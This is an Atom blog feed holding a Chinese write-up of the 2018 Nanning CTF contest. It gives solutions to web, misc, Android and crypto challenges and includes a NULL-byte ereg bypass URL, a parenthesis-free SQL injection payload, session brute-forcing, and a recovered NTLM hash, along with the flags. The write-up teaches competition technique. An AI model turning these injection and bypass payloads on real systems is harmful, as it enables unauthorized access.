<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robot&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-12-17T04:34:30.725Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Robot</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>南宁市网络空间安全大赛</title>
    <link href="http://yoursite.com/2018/12/16/%E5%8D%97%E5%AE%81%E5%B8%82%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>http://yoursite.com/2018/12/16/南宁市网络空间安全大赛/</id>
    <published>2018-12-16T13:06:44.000Z</published>
    <updated>2018-12-17T04:34:30.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="1-、超简单"><a href="#1-、超简单" class="headerlink" title="1)、超简单"></a>1)、超简单</h3><a id="more"></a><p>打开题目就看到了源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$white_list = range(0,9); </span><br><span class="line">require_once(&apos;flag.php&apos;); </span><br><span class="line">if(isset($_REQUEST[&apos;no&apos;]))&#123; </span><br><span class="line">    $a=$_REQUEST[&apos;no&apos;]; </span><br><span class="line">    if(@ereg(&quot;^[0-9]+$&quot;, $a) === FALSE)&#123; </span><br><span class="line">        echo &apos;no must be number&apos;; </span><br><span class="line">    &#125;else&#123; </span><br><span class="line">        if(in_array($a,$white_list))&#123; </span><br><span class="line">            if(strlen($a)&gt;1)&#123; </span><br><span class="line">                echo &apos;you are a great dark phper&lt;br&gt;&apos;; </span><br><span class="line">                echo &quot;&lt;img src=&apos;dark.gif&apos;&gt;&lt;br&gt;&quot;; </span><br><span class="line">                echo $flag; </span><br><span class="line">            &#125;else&#123; </span><br><span class="line">                echo &apos;you no dark&apos;; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;else&#123; </span><br><span class="line">            echo &apos;you are so dark&apos;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;     </span><br><span class="line">&#125;else </span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>看到里面有个ereg()函数，因为ereg函数存在NULL截断漏洞，所以直接构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://gxnnctf.gxsosec.cn:12311/?no=1%00</span><br></pre></td></tr></table></figure><p><img src="/2018/12/16/南宁市网络空间安全大赛/1.png" alt="image"></p><p>得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H0xIkKSSKS62UXPgLtCElE8jDCL7a2nqxDTT</span><br></pre></td></tr></table></figure><h3 id="2）、帽子商城"><a href="#2）、帽子商城" class="headerlink" title="2）、帽子商城"></a>2）、帽子商城</h3><p>这个题目很骚，官方放出tips:1s，所以判断应该是条件竞争。<br>跟2017年的0ctf的一题很像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://momomoxiaoxi.com/2017/03/21/0CTF/?tdsourcetag=s_pcqq_aiomsg</span><br></pre></td></tr></table></figure><p>但是这题的session并没有变，所以想到同一个浏览器访问的phpsession是一样的，所以换个浏览器就有两个cookie，先改包用0元过level 1，再用另一个浏览器登陆刚才的账号，抓包发到intruder，爆破phpsession，payload就是那两个session。<br><img src="/2018/12/16/南宁市网络空间安全大赛/4.png" alt="image"><br><img src="/2018/12/16/南宁市网络空间安全大赛/5.png" alt="image"></p><p><img src="/2018/12/16/南宁市网络空间安全大赛/2.png" alt="image"></p><h3 id="3）、sql"><a href="#3）、sql" class="headerlink" title="3）、sql???"></a>3）、sql???</h3><p>扫一下发现目录里面有./git，.git源码泄露，网上找脚本打把index.php dump下来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &apos;gxnnctf&#123;***************************&#125;&apos;;</span><br><span class="line">require_once(&apos;config.php&apos;);</span><br><span class="line">$conn = new mysqli($db_servername,$db_username,$db_password,$db_name);</span><br><span class="line">if($conn-&gt;connect_error)&#123;</span><br><span class="line">    die(&quot;Connect failed:&quot;.$conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;id&apos;]))&#123;</span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is&apos;,$id))</span><br><span class="line">        die(&apos;Don\&apos;t hurt me :-(&apos;);</span><br><span class="line">    $sql = &quot;select username from user where id = &quot;.$id;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    if($result)&#123;</span><br><span class="line">        $row = $result-&gt;fetch_array();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo mysqli_error($conn);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    echo(&apos;hello &apos;.$row[&apos;username&apos;].&apos;&lt;br&gt;&apos;);</span><br><span class="line">    $username = $row[&apos;username&apos;];</span><br><span class="line">    if($username === &apos;guest&apos;)&#123;</span><br><span class="line">        $ip = @$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]!=&quot;&quot; ? $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]:$_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">        if(preg_match(&apos;#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is&apos;,$ip))&#123;</span><br><span class="line">            die(&apos;Don\&apos; hack me&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(!empty($ip))&#123;</span><br><span class="line">            echo &apos;you from &apos;.$ip.&apos; , I remembered it.&lt;br&gt;&apos;;</span><br><span class="line">            $conn-&gt;query(&quot;insert into logs(ip) values(&apos;$ip&apos;)&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $result = $conn-&gt;query(&quot;select username from user where id =&quot;.$id);</span><br><span class="line">        $row = $result-&gt;fetch_array();</span><br><span class="line">        $username = $row[&apos;username&apos;];</span><br><span class="line">        if($username === &apos;admin&apos;)&#123;</span><br><span class="line">            var_dump($_GET[&apos;backdoor&apos;]);</span><br><span class="line">            if(isset($_GET[&apos;backdoor&apos;])&amp;&amp;$_GET[&apos;backdoor&apos;]===&apos;Melonrind&apos;)&#123;</span><br><span class="line">                echo &apos;you find the backdoor!!!&lt;br&gt;&apos;;</span><br><span class="line">                die($flag);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &quot;you are so great,but you don\&apos;t have backdoor,so continue to challenge :(&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;but i don\&apos;t waiting for you &quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;emmmmm&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &apos;welcome to gxnnctf2018!&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;i filtered everything,so have a good time :)&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哇，过滤了一堆东西，居然连括号都过滤了。</p><p>大概意思就是要username是guest同时也要是admin才能得到flag，<br>搜了一下发现跟<a href="#">SeePwn CTF</a>的一道注入题差不多：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://heartsky.info/2017/07/16/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%B3%BB%E5%88%97/?tdsourcetag=s_pcqq_aiomsg</span><br></pre></td></tr></table></figure><p>所以按照他的思路来就是：</p><p>在第一条语句中定义了一个自定义变量，根据它是否为 NULL 作为判断条件。除了 if 还可以用 case 语句，而且没有圆括号</p><p>构造出最终payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=case when @hs is null then @hs:=2 else 1 end # &amp;backdoor=Melonrind</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="1-、太简单了"><a href="#1-、太简单了" class="headerlink" title="1)、太简单了"></a>1)、太简单了</h3><p>下载下来是个没有后缀的文件，binwalk看到是个zip，但是解压不了，winhex打开发现文件头不对，把头改成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">50 4b 03 04</span><br></pre></td></tr></table></figure><p>压缩文件的头，解压后得到flag.png:</p><p><img src="/2018/12/16/南宁市网络空间安全大赛/3.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Do_you_know_ziphead</span><br></pre></td></tr></table></figure><h3 id="2-、misc2"><a href="#2-、misc2" class="headerlink" title="2)、misc2"></a>2)、misc2</h3><p>这么多文件爆破肯定是不可能的啦，所以猜到是crc加密，网上找表哥的脚本跑：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import zipfile</span><br><span class="line">import string</span><br><span class="line">import binascii</span><br><span class="line">  </span><br><span class="line">def CrackCrc(crc):</span><br><span class="line">    for i in dic:</span><br><span class="line">        for j in dic:</span><br><span class="line">            for p in dic:</span><br><span class="line">                for q in dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    if crc == (binascii.crc32(s) &amp; 0xffffffff):</span><br><span class="line">                        #print s</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        return</span><br><span class="line">  </span><br><span class="line">def CrackZip():</span><br><span class="line">    for I in range(39):</span><br><span class="line">        file = &apos;chunk&apos; + str(I) + &apos;.zip&apos;</span><br><span class="line">        f = zipfile.ZipFile(file, &apos;r&apos;)</span><br><span class="line">        GetCrc = f.getinfo(&apos;data.txt&apos;)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        #以上3行为获取压缩包CRC32值的步骤</span><br><span class="line">        #print hex(crc)</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line">  </span><br><span class="line">dic = string.ascii_letters + string.digits + &apos;+/=&apos;</span><br><span class="line">  </span><br><span class="line">f = open(&apos;out.txt&apos;, &apos;w&apos;)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">090 051 104 117 098 109 078 048 090 110 115 121 097 086 066 102 081 051 074 106 088 050 112 049 078 088 082 102 083 122 070 069 090 068 070 117 079 088 048</span><br></pre></td></tr></table></figure><p>再十进制转ascii得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Z3hubmN0ZnsyaVBfQ3JjX2p1NXRfSzFEZDFuOX0</span><br></pre></td></tr></table></figure><p>再转base64得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2iP_Crc_ju5t_K1Dd1n9</span><br></pre></td></tr></table></figure><h3 id="3-、txt"><a href="#3-、txt" class="headerlink" title="3)、txt"></a>3)、txt</h3><p>附件是这么一句蛇皮的话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Guangxi NanNing CTF,enjoy this,have a good time.(｡･∀･)ﾉﾞ</span><br></pre></td></tr></table></figure><p>零宽度空间隐写，直接丢网站上面解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://offdev.net/demos/zwsp-steg-js?tdsourcetag=s_pctim_aiomsg</span><br></pre></td></tr></table></figure><p>最后得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T2oFG2ZoAzVsK7dXy1ZLrIxY8E5q8uHjG5Cz</span><br></pre></td></tr></table></figure><h3 id="3-、流量包"><a href="#3-、流量包" class="headerlink" title="3)、流量包"></a>3)、流量包</h3><p>打开流量包分析发现他执行了这些操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">查看权限</span><br><span class="line"></span><br><span class="line">dir目录</span><br><span class="line"></span><br><span class="line">查看flag.zip</span><br><span class="line"></span><br><span class="line">上传exe文件</span><br><span class="line"></span><br><span class="line">运行exe产生dmp</span><br><span class="line"></span><br><span class="line">makecab打包dmp</span><br><span class="line"></span><br><span class="line">查看dmp的zip</span><br></pre></td></tr></table></figure><p>后来发现导出的http是看不到zip的，所以用networkMiner查看，可以看到：</p><p><img src="/2018/12/16/南宁市网络空间安全大赛/6.png" alt="image"></p><p>其中14219B的就是flag.zip,把dmp还原，得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntlm: 11da62168bb9a260cc9ba7e798e31953</span><br></pre></td></tr></table></figure><p>解码得到：gx2018，最后用gx2018的md5值解开flag.zip，得到一张图片，再用文本打开图片搜索关键字”flag、gxnnctf、ctf”等各种关键字，最后是ctf搜出了flag，最终flag为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6OUpOR89CMIb95FOym41AbijPgsySBdmWdwT</span><br></pre></td></tr></table></figure><h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2><h3 id="1-、Android300"><a href="#1-、Android300" class="headerlink" title="1)、Android300"></a>1)、Android300</h3><p>将APK反编译后利用JD查看java层源码，发现调用了libnative-lib.so对输入的值进行判断，对该so文件静态分析，得到伪C代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">if ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">    v9 = Twofish_setup(&amp;v19, 0xC0u);</span><br><span class="line">    Twofish_encryt();</span><br><span class="line">    Twofish_decryt(v9, v26, &amp;v25);</span><br><span class="line">    v10 = 0;</span><br><span class="line">    v11 = &quot;fail&quot;;</span><br><span class="line">    while ( byte_4780[v10] == v26[v10] )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = v10 + 1;</span><br><span class="line">      v13 = v10++ &gt;= 0xF;</span><br><span class="line">      if ( v13 )</span><br><span class="line">      &#123;</span><br><span class="line">    if ( v12 == 16 )</span><br><span class="line">    &#123;</span><br><span class="line">      Twofish_decryt(v9, &amp;v15, &amp;v25);</span><br><span class="line">      v11 = malloc(0x11u);</span><br><span class="line">      *(v11 + 16) = 0;</span><br><span class="line">      _aeabi_memcpy(v11, &amp;v25, 16);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return (*(*v3 + 668))(v3, v11);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">    v11 = &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return (*(*v3 + 668))(v3, v11);</span><br></pre></td></tr></table></figure><p>发现这里的算法是Twofish加密方式、继续分析发现返回值为v11，与java层联系分析发现正确输入后的的返回值即为flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">paramAnonymousView = MainActivity.this.stringFromJNI(paramAnonymousView);</span><br><span class="line"></span><br><span class="line">        paramAnonymousView = MainActivity.this.stringFromJNI(paramAnonymousView);</span><br><span class="line">        if (paramAnonymousView.equals(&quot;fail&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">          MainActivity.this.tv.setText(&quot;try again&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          TextView localTextView = MainActivity.this.tv;</span><br><span class="line">          StringBuilder localStringBuilder = new StringBuilder();</span><br><span class="line">          localStringBuilder.append(&quot;flag&#123;&quot;);</span><br><span class="line">          localStringBuilder.append(paramAnonymousView);</span><br><span class="line">          localStringBuilder.append(&quot;&#125;&quot;);</span><br><span class="line">          localTextView.setText(localStringBuilder.toString());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>由于静态分析代码太多进行动态调试，目的获取v11在赋值为falg时查看其对应寄存器中的值</p><p>用ida在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java_com_gxsosec_www_android_1crackme3_MainActivity_stringFromJNI</span><br></pre></td></tr></table></figure></p><p>的起始处下断点，并通过修改对应寄存器的值来控制代码流程，使其步入if ( v12 == 16 )的ture判断中，当代码_aeabi_memcpy(v11, &amp;v25, 16);执行完毕后v11不再改变，此时查看其对应R5寄存器中的值即可得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">it_w@3_n0t_kn0wn</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="1-、维吉尼亚遇上困难"><a href="#1-、维吉尼亚遇上困难" class="headerlink" title="1)、维吉尼亚遇上困难"></a>1)、维吉尼亚遇上困难</h3><p>看题目就是维吉尼亚加密了</p><p>先用脚本暴力破解一次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">def virginiaCrack(cipherText): # 解密函数</span><br><span class="line">    length = getKeyLen(cipherText) #得到密钥长度</span><br><span class="line">    key = getKey(cipherText,length) #找到密钥</span><br><span class="line">    keyStr = &apos;&apos;</span><br><span class="line">    for k in key:</span><br><span class="line">        keyStr+=k</span><br><span class="line">    print(&apos;the key:&apos;,keyStr)</span><br><span class="line">    plainText = &apos;&apos;</span><br><span class="line">    index = 0</span><br><span class="line">    for ch in cipherText:</span><br><span class="line">        c = chr((ord(ch)-ord(key[index%length]))%26+97)</span><br><span class="line">        plainText += c</span><br><span class="line">        index+=1</span><br><span class="line">    return plainText</span><br><span class="line">def openfile(fileName): # 读文件</span><br><span class="line">    file = open(&quot;2.txt&quot;,&apos;r&apos;)</span><br><span class="line">    text = file.read()</span><br><span class="line">    file.close();</span><br><span class="line">    text = text.replace(&apos;\n&apos;,&apos;&apos;)</span><br><span class="line">    return text</span><br><span class="line"></span><br><span class="line">def getKeyLen(cipherText): # 获取密钥长度</span><br><span class="line">    keylength = 1</span><br><span class="line">    maxCount = 0</span><br><span class="line">    for step in range(3,18): # 循环密钥长度</span><br><span class="line">        count = 0</span><br><span class="line">        for i in range(step,len(cipherText)-step):</span><br><span class="line">            if cipherText[i] == cipherText[i+step]:</span><br><span class="line">                 count += 1</span><br><span class="line">        if count&gt;maxCount:</span><br><span class="line">            maxCount = count</span><br><span class="line">            keylength = step</span><br><span class="line">    return keylength</span><br><span class="line"></span><br><span class="line">def getKey(text,length): # 获取密钥</span><br><span class="line">    key = [] # 定义空白列表用来存密钥</span><br><span class="line">    alphaRate =[0.08167,0.01492,0.02782,0.04253,0.12705,0.02228,0.02015,0.06094,0.06996,0.00153,0.00772,0.04025,0.02406,0.06749,0.07507,0.01929,0.0009,0.05987,0.06327,0.09056,0.02758,0.00978,0.02360,0.0015,0.01974,0.00074]</span><br><span class="line">    matrix =textToList(text,length)</span><br><span class="line">    for i in range(length):</span><br><span class="line">        w = [row[i] for row in matrix] #获取每组密文</span><br><span class="line">        li = countList(w) </span><br><span class="line">        powLi = [] #算乘积</span><br><span class="line">        for j in range(26):</span><br><span class="line">            Sum = 0.0</span><br><span class="line">            for k in range(26):</span><br><span class="line">                Sum += alphaRate[k]*li[k]</span><br><span class="line">            powLi.append(Sum)</span><br><span class="line">            li = li[1:]+li[:1]#循环移位</span><br><span class="line">        Abs = 100</span><br><span class="line">        ch = &apos;&apos;</span><br><span class="line">        for j in range(len(powLi)):</span><br><span class="line">             if abs(powLi[j] -0.065546)&lt;Abs: # 找出最接近英文字母重合指数的项</span><br><span class="line">                 Abs = abs(powLi[j] -0.065546) # 保存最接近的距离，作为下次比较的基准</span><br><span class="line">                 ch = chr(j+97)</span><br><span class="line">        key.append(ch)</span><br><span class="line">    return key                </span><br><span class="line"></span><br><span class="line">def countList(lis): # 统计字母频度</span><br><span class="line">    li = []</span><br><span class="line">    alphabet = [chr(i) for i in range(97,123)]</span><br><span class="line">    for c in alphabet:</span><br><span class="line">        count = 0</span><br><span class="line">        for ch in lis:</span><br><span class="line">            if ch == c:</span><br><span class="line">                count+=1</span><br><span class="line">        li.append(count/len(lis))</span><br><span class="line">    return li</span><br><span class="line"></span><br><span class="line">def textToList(text,length): # 根据密钥长度将密文分组</span><br><span class="line">    textMatrix = []</span><br><span class="line">    row = []</span><br><span class="line">    index = 0</span><br><span class="line">    for ch in text:</span><br><span class="line">        row.append(ch)</span><br><span class="line">        index += 1</span><br><span class="line">        if index % length ==0:</span><br><span class="line">            textMatrix.append(row)</span><br><span class="line">            row = []</span><br><span class="line">    return textMatrix</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    cipherText = openfile(r&apos;&apos;) # 这里要根据文档目录的不同而改变</span><br><span class="line">    plainText= virginiaCrack(cipherText)</span><br><span class="line">    print(&apos;the plainText:\n&apos;,plainText)</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vtanhjggwatzjoqdwocalqrjzhfbtweiujafesdhlukzcoslupahjuhogxkiubgqnadxraigjdjneuuptcocqepnowqvqhzqxzogjdqjgkajnhqrnmxjfjgqdurobbrqjzrrapujzhnrpzeisclvikdbwvpqpzswakzaomovxqpcsundanvhxeabwngnqcoyzdcnpoadbbcgopdcwoqskqsaaoqjoowqczaqouhcfejbxeimjdnnqdkidbrfvdujtbpkqjxsjaffaxvwbnactwwgyapccdfczzvbmgyaodblrvikovxhumjyowqhaqmhqrnmxjfjgqducobogqjmswnoqzvgcugepvhnxgkhvpxecfkmmxspqprcaxkzcvbmfyupxvraifaxvwbnactphzkzenhalqroxwnaeqwircretjjzxtarhvurfaaqvfnfqweirul</span><br></pre></td></tr></table></figure><p>然后再丢到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://68.168.134.3/vigener/</span><br></pre></td></tr></table></figure><p>解得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thestatekeylaboratoryofnetworkingandswitchingtechnologybelongstobeijinguniversityofpostsandtelecommunicationsthelaboratorywasopenedinnineteenninetytwoinnineteenninetyfivethelaboratorypassedacceptanceinspectionbogovernmentandanevaluationorganizedbyministryofscienceandtechnologyintwothousandandtwosincetwothousandandfourthelaboratoryhasbeenrenamedasthestatekeylaboratoryofnetworkingandswitchingtechnologybyministryofscienceandtechnologyflagisyouaresokindly</span><br></pre></td></tr></table></figure><p>这么一段英文，flag就是最后一句，flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you are so kindly</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
